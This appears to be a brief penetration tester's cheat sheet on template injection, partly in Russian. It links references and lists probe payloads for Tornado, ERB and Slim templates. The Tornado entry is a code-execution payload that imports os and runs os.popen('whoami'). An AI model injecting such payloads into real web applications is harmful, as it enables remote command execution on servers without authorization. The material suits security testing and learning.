# SSTI/CSTI

Flask & Jinja2 [https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)

Template Injection Workshop (по сути, примеры, как это работает в python, php, java,..): [https://gosecure.github.io/template-injection-workshop/#0](https://gosecure.github.io/template-injection-workshop/#0)

Норм описание для h1 для CSTI: [https://hackerone.com/reports/125027](https://hackerone.com/reports/125027)

## Python

### Tornado

Link: [https://www.tornadoweb.org/en/stable/](https://www.tornadoweb.org/en/stable/)

Basic:

```python
{{ 2*2 }}
{% raw %}
{% import subprocess %}
{% import os %}
{% endraw %}{{ os.popen("whoami").read() }}
```

## Ruby

### ERB

Link: [https://puppet.com/docs/puppet/5.5/lang\_template\_erb.html](https://puppet.com/docs/puppet/5.5/lang\_template\_erb.html)

Basic:

```ruby
<%= 7 * 7 %>
```

### Slim

Link: [https://github.com/slim-template/slim](https://github.com/slim-template/slim)

Basic:

```ruby
#{ 7 * 7 }
```
